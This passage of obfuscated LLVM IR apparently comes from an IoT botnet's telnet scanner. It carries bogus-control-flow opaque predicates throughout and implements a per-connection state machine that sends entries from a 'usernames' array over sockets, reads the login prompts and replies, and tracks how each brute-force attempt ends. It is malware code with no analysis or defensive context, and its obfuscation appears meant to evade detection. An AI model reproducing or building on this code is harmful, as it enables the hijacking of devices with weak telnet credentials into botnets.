  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %461
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %462, i32 0, i32 7
  store i16 0, i16* %463, align 16
  %464 = load i32, i32* %10, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %465
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %466, i32 0, i32 8
  %468 = load i8*, i8** %467, align 8
  call void @llvm.memset.p0i8.i64(i8* %468, i8 0, i64 1024, i32 1, i1 false)
  %469 = load i32, i32* %10, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %470
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %471, i32 0, i32 2
  store i8 2, i8* %472, align 8
  br label %2839

; <label>:473:                                    ; preds = %427
  br label %509

; <label>:474:                                    ; preds = %386
  %475 = load i32, i32* %11, align 4
  %476 = icmp eq i32 %475, -1
  br i1 %476, label %477, label %492

; <label>:477:                                    ; preds = %474
  %478 = load i32, i32* %10, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %479
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %480, i32 0, i32 0
  %482 = load i32, i32* %481, align 16
  %483 = call i32 @sclose(i32 %482)
  %484 = load i32, i32* %10, align 4
  %485 = sext i32 %484 to i64
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %485
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %486, i32 0, i32 2
  store i8 0, i8* %487, align 8
  %488 = load i32, i32* %10, align 4
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %489
  %491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %490, i32 0, i32 3
  store i8 1, i8* %491, align 1
  br label %492

; <label>:492:                                    ; preds = %477, %474
  %493 = load i32, i32* @x.65
  %494 = load i32, i32* @y.66
  %495 = sub i32 %493, 1
  %496 = mul i32 %493, %495
  %497 = urem i32 %496, 2
  %498 = icmp eq i32 %497, 0
  %499 = icmp slt i32 %494, 10
  %500 = or i1 %498, %499
  br i1 %500, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %492
  %501 = load i32, i32* @x.65
  %502 = load i32, i32* @y.66
  %503 = sub i32 %501, 1
  %504 = mul i32 %501, %503
  %505 = urem i32 %504, 2
  %506 = icmp eq i32 %505, 0
  %507 = icmp slt i32 %502, 10
  %508 = or i1 %506, %507
  br i1 %508, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %509

; <label>:509:                                    ; preds = %originalBBpart260, %473
  %510 = load i32, i32* @x.65
  %511 = load i32, i32* @y.66
  %512 = sub i32 %510, 1
  %513 = mul i32 %510, %512
  %514 = urem i32 %513, 2
  %515 = icmp eq i32 %514, 0
  %516 = icmp slt i32 %511, 10
  %517 = or i1 %515, %516
  br i1 %517, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %509
  %518 = load i32, i32* %10, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %519
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %520, i32 0, i32 6
  %522 = load i32, i32* %521, align 4
  %523 = add i32 %522, 10
  %524 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %525 = icmp ult i32 %523, %524
  %526 = load i32, i32* @x.65
  %527 = load i32, i32* @y.66
  %528 = sub i32 %526, 1
  %529 = mul i32 %526, %528
  %530 = urem i32 %529, 2
  %531 = icmp eq i32 %530, 0
  %532 = icmp slt i32 %527, 10
  %533 = or i1 %531, %532
  br i1 %533, label %originalBBpart276, label %originalBB62alteredBB

originalBBpart276:                                ; preds = %originalBB62
  br i1 %525, label %534, label %549

; <label>:534:                                    ; preds = %originalBBpart276
  %535 = load i32, i32* %10, align 4
  %536 = sext i32 %535 to i64
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %536
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %537, i32 0, i32 0
  %539 = load i32, i32* %538, align 16
  %540 = call i32 @sclose(i32 %539)
  %541 = load i32, i32* %10, align 4
  %542 = sext i32 %541 to i64
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %542
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %543, i32 0, i32 2
  store i8 0, i8* %544, align 8
  %545 = load i32, i32* %10, align 4
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %546
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %547, i32 0, i32 3
  store i8 1, i8* %548, align 1
  br label %549

; <label>:549:                                    ; preds = %534, %originalBBpart276
  br label %2838

; <label>:550:                                    ; preds = %116
  %551 = load i32, i32* %10, align 4
  %552 = sext i32 %551 to i64
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %552
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %553, i32 0, i32 6
  %555 = load i32, i32* %554, align 4
  %556 = icmp eq i32 %555, 0
  br i1 %556, label %557, label %563

; <label>:557:                                    ; preds = %550
  %558 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %559 = load i32, i32* %10, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %560
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %561, i32 0, i32 6
  store i32 %558, i32* %562, align 4
  br label %563

; <label>:563:                                    ; preds = %557, %550
  %564 = load i32, i32* %10, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %565
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %566, i32 0, i32 0
  %568 = load i32, i32* %567, align 16
  %569 = load i32, i32* %10, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %570
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %571, i32 0, i32 8
  %573 = load i8*, i8** %572, align 8
  %574 = load i32, i32* %10, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %575
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %576, i32 0, i32 7
  %578 = load i16, i16* %577, align 16
  %579 = zext i16 %578 to i32
  %580 = call i32 @readUntil(i32 %568, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %573, i32 1024, i32 %579)
  %581 = icmp ne i32 %580, 0
  br i1 %581, label %582, label %614

; <label>:582:                                    ; preds = %563
  %583 = load i32, i32* %10, align 4
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %584
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %585, i32 0, i32 6
  store i32 0, i32* %586, align 4
  %587 = load i32, i32* %10, align 4
  %588 = sext i32 %587 to i64
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %588
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %589, i32 0, i32 7
  store i16 0, i16* %590, align 16
  %591 = load i32, i32* %10, align 4
  %592 = sext i32 %591 to i64
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %592
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %593, i32 0, i32 8
  %595 = load i8*, i8** %594, align 8
  %596 = call i8* @strstr(i8* %595, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %597 = icmp ne i8* %596, null
  br i1 %597, label %598, label %603

; <label>:598:                                    ; preds = %582
  %599 = load i32, i32* %10, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %600
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %601, i32 0, i32 2
  store i8 5, i8* %602, align 8
  br label %608

; <label>:603:                                    ; preds = %582
  %604 = load i32, i32* %10, align 4
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %605
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %606, i32 0, i32 2
  store i8 3, i8* %607, align 8
  br label %608

; <label>:608:                                    ; preds = %603, %598
  %609 = load i32, i32* %10, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %610
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %611, i32 0, i32 8
  %613 = load i8*, i8** %612, align 8
  call void @llvm.memset.p0i8.i64(i8* %613, i8 0, i64 1024, i32 1, i1 false)
  br label %2839

; <label>:614:                                    ; preds = %563
  %615 = load i32, i32* %10, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %616
  %618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %617, i32 0, i32 0
  %619 = load i32, i32* %618, align 16
  %620 = load i32, i32* %10, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %621
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %622, i32 0, i32 8
  %624 = load i8*, i8** %623, align 8
  %625 = load i32, i32* %10, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %626
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %627, i32 0, i32 7
  %629 = load i16, i16* %628, align 16
  %630 = zext i16 %629 to i32
  %631 = call i32 @readUntil(i32 %619, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.42, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %624, i32 1024, i32 %630)
  %632 = icmp ne i32 %631, 0
  br i1 %632, label %633, label %701

; <label>:633:                                    ; preds = %614
  %634 = load i32, i32* %10, align 4
  %635 = sext i32 %634 to i64
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %635
  %637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %636, i32 0, i32 6
  store i32 0, i32* %637, align 4
  %638 = load i32, i32* %10, align 4
  %639 = sext i32 %638 to i64
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %639
  %641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %640, i32 0, i32 7
  store i16 0, i16* %641, align 16
  %642 = load i32, i32* %10, align 4
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %643
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %644, i32 0, i32 8
  %646 = load i8*, i8** %645, align 8
  %647 = call i8* @strstr(i8* %646, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %648 = icmp ne i8* %647, null
  br i1 %648, label %649, label %670

; <label>:649:                                    ; preds = %633
  %650 = load i32, i32* @x.65
  %651 = load i32, i32* @y.66
  %652 = sub i32 %650, 1
  %653 = mul i32 %650, %652
  %654 = urem i32 %653, 2
  %655 = icmp eq i32 %654, 0
  %656 = icmp slt i32 %651, 10
  %657 = or i1 %655, %656
  br i1 %657, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %649
  %658 = load i32, i32* %10, align 4
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %659
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %660, i32 0, i32 2
  store i8 5, i8* %661, align 8
  %662 = load i32, i32* @x.65
  %663 = load i32, i32* @y.66
  %664 = sub i32 %662, 1
  %665 = mul i32 %662, %664
  %666 = urem i32 %665, 2
  %667 = icmp eq i32 %666, 0
  %668 = icmp slt i32 %663, 10
  %669 = or i1 %667, %668
  br i1 %669, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %675

; <label>:670:                                    ; preds = %633
  %671 = load i32, i32* %10, align 4
  %672 = sext i32 %671 to i64
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %672
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %673, i32 0, i32 2
  store i8 3, i8* %674, align 8
  br label %675

; <label>:675:                                    ; preds = %670, %originalBBpart280
  %676 = load i32, i32* @x.65
  %677 = load i32, i32* @y.66
  %678 = sub i32 %676, 1
  %679 = mul i32 %676, %678
  %680 = urem i32 %679, 2
  %681 = icmp eq i32 %680, 0
  %682 = icmp slt i32 %677, 10
  %683 = or i1 %681, %682
  br i1 %683, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %675
  %684 = load i32, i32* %10, align 4
  %685 = sext i32 %684 to i64
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %685
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %686, i32 0, i32 8
  %688 = load i8*, i8** %687, align 8
  call void @llvm.memset.p0i8.i64(i8* %688, i8 0, i64 1024, i32 1, i1 false)
  %689 = load i32, i32* %10, align 4
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %690
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %691, i32 0, i32 2
  store i8 3, i8* %692, align 8
  %693 = load i32, i32* @x.65
  %694 = load i32, i32* @y.66
  %695 = sub i32 %693, 1
  %696 = mul i32 %693, %695
  %697 = urem i32 %696, 2
  %698 = icmp eq i32 %697, 0
  %699 = icmp slt i32 %694, 10
  %700 = or i1 %698, %699
  br i1 %700, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %2839

; <label>:701:                                    ; preds = %614
  %702 = load i32, i32* %10, align 4
  %703 = sext i32 %702 to i64
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %703
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %704, i32 0, i32 8
  %706 = load i8*, i8** %705, align 8
  %707 = call i64 @strlen(i8* %706) #10
  %708 = trunc i64 %707 to i16
  %709 = load i32, i32* %10, align 4
  %710 = sext i32 %709 to i64
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %710
  %712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %711, i32 0, i32 7
  store i16 %708, i16* %712, align 16
  br label %713

; <label>:713:                                    ; preds = %701
  br label %714

; <label>:714:                                    ; preds = %713
  %715 = load i32, i32* %10, align 4
  %716 = sext i32 %715 to i64
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %716
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %717, i32 0, i32 6
  %719 = load i32, i32* %718, align 4
  %720 = add i32 %719, 10
  %721 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %722 = icmp ult i32 %720, %721
  br i1 %722, label %723, label %754

; <label>:723:                                    ; preds = %714
  %724 = load i32, i32* @x.65
  %725 = load i32, i32* @y.66
  %726 = sub i32 %724, 1
  %727 = mul i32 %724, %726
  %728 = urem i32 %727, 2
  %729 = icmp eq i32 %728, 0
  %730 = icmp slt i32 %725, 10
  %731 = or i1 %729, %730
  br i1 %731, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %723
  %732 = load i32, i32* %10, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %733
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %734, i32 0, i32 0
  %736 = load i32, i32* %735, align 16
  %737 = call i32 @sclose(i32 %736)
  %738 = load i32, i32* %10, align 4
  %739 = sext i32 %738 to i64
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %739
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %740, i32 0, i32 2
  store i8 0, i8* %741, align 8
  %742 = load i32, i32* %10, align 4
  %743 = sext i32 %742 to i64
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %743
  %745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %744, i32 0, i32 3
  store i8 1, i8* %745, align 1
  %746 = load i32, i32* @x.65
  %747 = load i32, i32* @y.66
  %748 = sub i32 %746, 1
  %749 = mul i32 %746, %748
  %750 = urem i32 %749, 2
  %751 = icmp eq i32 %750, 0
  %752 = icmp slt i32 %747, 10
  %753 = or i1 %751, %752
  br i1 %753, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br label %754

; <label>:754:                                    ; preds = %originalBBpart288, %714
  br label %2838

; <label>:755:                                    ; preds = %116
  %756 = load i32, i32* %10, align 4
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %757
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %758, i32 0, i32 0
  %760 = load i32, i32* %759, align 16
  %761 = load i32, i32* %10, align 4
  %762 = sext i32 %761 to i64
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %762
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %763, i32 0, i32 4
  %765 = load i8, i8* %764, align 2
  %766 = zext i8 %765 to i64
  %767 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %766
  %768 = load i8*, i8** %767, align 8
  %769 = load i32, i32* %10, align 4
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %770
  %772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %771, i32 0, i32 4
  %773 = load i8, i8* %772, align 2
  %774 = zext i8 %773 to i64
  %775 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %774
  %776 = load i8*, i8** %775, align 8
  %777 = call i64 @strlen(i8* %776) #10
  %778 = call i64 @send(i32 %760, i8* %768, i64 %777, i32 16384)
  %779 = icmp slt i64 %778, 0
  br i1 %779, label %780, label %811

; <label>:780:                                    ; preds = %755
  %781 = load i32, i32* @x.65
  %782 = load i32, i32* @y.66
  %783 = sub i32 %781, 1
  %784 = mul i32 %781, %783
  %785 = urem i32 %784, 2
  %786 = icmp eq i32 %785, 0
  %787 = icmp slt i32 %782, 10
  %788 = or i1 %786, %787
  br i1 %788, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %780
  %789 = load i32, i32* %10, align 4
  %790 = sext i32 %789 to i64
  %791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %790
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %791, i32 0, i32 0
  %793 = load i32, i32* %792, align 16
  %794 = call i32 @sclose(i32 %793)
  %795 = load i32, i32* %10, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %796
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %797, i32 0, i32 2
  store i8 0, i8* %798, align 8
  %799 = load i32, i32* %10, align 4
  %800 = sext i32 %799 to i64
  %801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %800
  %802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %801, i32 0, i32 3
  store i8 1, i8* %802, align 1
  %803 = load i32, i32* @x.65
  %804 = load i32, i32* @y.66
  %805 = sub i32 %803, 1
  %806 = mul i32 %803, %805
  %807 = urem i32 %806, 2
  %808 = icmp eq i32 %807, 0
  %809 = icmp slt i32 %804, 10
  %810 = or i1 %808, %809
  br i1 %810, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br label %2839

; <label>:811:                                    ; preds = %755
  %812 = load i32, i32* %10, align 4
  %813 = sext i32 %812 to i64
  %814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %813
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %814, i32 0, i32 0
  %816 = load i32, i32* %815, align 16
  %817 = call i64 @send(i32 %816, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i32 0, i32 0), i64 2, i32 16384)
  %818 = icmp slt i64 %817, 0
  br i1 %818, label %819, label %850

; <label>:819:                                    ; preds = %811
  %820 = load i32, i32* @x.65
  %821 = load i32, i32* @y.66
  %822 = sub i32 %820, 1
  %823 = mul i32 %820, %822
  %824 = urem i32 %823, 2
  %825 = icmp eq i32 %824, 0
  %826 = icmp slt i32 %821, 10
  %827 = or i1 %825, %826
  br i1 %827, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %819
  %828 = load i32, i32* %10, align 4
  %829 = sext i32 %828 to i64
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %829
  %831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %830, i32 0, i32 0
  %832 = load i32, i32* %831, align 16
  %833 = call i32 @sclose(i32 %832)
  %834 = load i32, i32* %10, align 4
  %835 = sext i32 %834 to i64
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %835
  %837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %836, i32 0, i32 2
  store i8 0, i8* %837, align 8
  %838 = load i32, i32* %10, align 4
  %839 = sext i32 %838 to i64
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %839
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %840, i32 0, i32 3
  store i8 1, i8* %841, align 1
  %842 = load i32, i32* @x.65
  %843 = load i32, i32* @y.66
  %844 = sub i32 %842, 1
  %845 = mul i32 %842, %844
  %846 = urem i32 %845, 2
  %847 = icmp eq i32 %846, 0
  %848 = icmp slt i32 %843, 10
  %849 = or i1 %847, %848
  br i1 %849, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %2839

; <label>:850:                                    ; preds = %811
  %851 = load i32, i32* %10, align 4
  %852 = sext i32 %851 to i64
  %853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %852
  %854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %853, i32 0, i32 2
  store i8 4, i8* %854, align 8
  br label %2838

; <label>:855:                                    ; preds = %116
  %856 = load i32, i32* @x.65
  %857 = load i32, i32* @y.66
  %858 = sub i32 %856, 1
  %859 = mul i32 %856, %858
  %860 = urem i32 %859, 2
  %861 = icmp eq i32 %860, 0
  %862 = icmp slt i32 %857, 10
  %863 = or i1 %861, %862
  br i1 %863, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %855
  %864 = load i32, i32* %10, align 4
  %865 = sext i32 %864 to i64
  %866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %865
  %867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %866, i32 0, i32 6
  %868 = load i32, i32* %867, align 4
  %869 = icmp eq i32 %868, 0
  %870 = load i32, i32* @x.65
  %871 = load i32, i32* @y.66
  %872 = sub i32 %870, 1
  %873 = mul i32 %870, %872
  %874 = urem i32 %873, 2
  %875 = icmp eq i32 %874, 0
  %876 = icmp slt i32 %871, 10
  %877 = or i1 %875, %876
  br i1 %877, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %869, label %878, label %884

; <label>:878:                                    ; preds = %originalBBpart2100
  %879 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %880 = load i32, i32* %10, align 4
  %881 = sext i32 %880 to i64
  %882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %881
  %883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %882, i32 0, i32 6
  store i32 %879, i32* %883, align 4
  br label %884

; <label>:884:                                    ; preds = %878, %originalBBpart2100
  %885 = load i32, i32* @x.65
  %886 = load i32, i32* @y.66
  %887 = sub i32 %885, 1
  %888 = mul i32 %885, %887
  %889 = urem i32 %888, 2
  %890 = icmp eq i32 %889, 0
  %891 = icmp slt i32 %886, 10
  %892 = or i1 %890, %891
  br i1 %892, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %884
  %893 = load i32, i32* %10, align 4
  %894 = sext i32 %893 to i64
  %895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %894
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %895, i32 0, i32 0
  %897 = load i32, i32* %896, align 16
  %898 = load i32, i32* %10, align 4
  %899 = sext i32 %898 to i64
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %899
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %900, i32 0, i32 8
  %902 = load i8*, i8** %901, align 8
  %903 = load i32, i32* %10, align 4
  %904 = sext i32 %903 to i64
  %905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %904
  %906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %905, i32 0, i32 7
  %907 = load i16, i16* %906, align 16
  %908 = zext i16 %907 to i32
  %909 = call i32 @readUntil(i32 %897, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %902, i32 1024, i32 %908)
  %910 = icmp ne i32 %909, 0
  %911 = load i32, i32* @x.65
  %912 = load i32, i32* @y.66
  %913 = sub i32 %911, 1
  %914 = mul i32 %911, %913
  %915 = urem i32 %914, 2
  %916 = icmp eq i32 %915, 0
  %917 = icmp slt i32 %912, 10
  %918 = or i1 %916, %917
  br i1 %918, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %910, label %919, label %999

; <label>:919:                                    ; preds = %originalBBpart2104
  %920 = load i32, i32* @x.65
  %921 = load i32, i32* @y.66
  %922 = sub i32 %920, 1
  %923 = mul i32 %920, %922
  %924 = urem i32 %923, 2
  %925 = icmp eq i32 %924, 0
  %926 = icmp slt i32 %921, 10
  %927 = or i1 %925, %926
  br i1 %927, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %919
  %928 = load i32, i32* %10, align 4
  %929 = sext i32 %928 to i64
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %929
  %931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %930, i32 0, i32 6
  store i32 0, i32* %931, align 4
  %932 = load i32, i32* %10, align 4
  %933 = sext i32 %932 to i64
  %934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %933
  %935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %934, i32 0, i32 7
  store i16 0, i16* %935, align 16
  %936 = load i32, i32* %10, align 4
  %937 = sext i32 %936 to i64
  %938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %937
  %939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %938, i32 0, i32 8
  %940 = load i8*, i8** %939, align 8
  %941 = call i8* @strstr(i8* %940, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0)) #10
  %942 = icmp ne i8* %941, null
  %943 = load i32, i32* @x.65
  %944 = load i32, i32* @y.66
  %945 = sub i32 %943, 1
  %946 = mul i32 %943, %945
  %947 = urem i32 %946, 2
  %948 = icmp eq i32 %947, 0
  %949 = icmp slt i32 %944, 10
  %950 = or i1 %948, %949
  br i1 %950, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %942, label %951, label %972

; <label>:951:                                    ; preds = %originalBBpart2108
  %952 = load i32, i32* @x.65
  %953 = load i32, i32* @y.66
  %954 = sub i32 %952, 1
  %955 = mul i32 %952, %954
  %956 = urem i32 %955, 2
  %957 = icmp eq i32 %956, 0
  %958 = icmp slt i32 %953, 10
  %959 = or i1 %957, %958
  br i1 %959, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %951
  %960 = load i32, i32* %10, align 4
  %961 = sext i32 %960 to i64
  %962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %961
  %963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %962, i32 0, i32 2
  store i8 5, i8* %963, align 8
  %964 = load i32, i32* @x.65
  %965 = load i32, i32* @y.66
  %966 = sub i32 %964, 1
  %967 = mul i32 %964, %966
  %968 = urem i32 %967, 2
  %969 = icmp eq i32 %968, 0
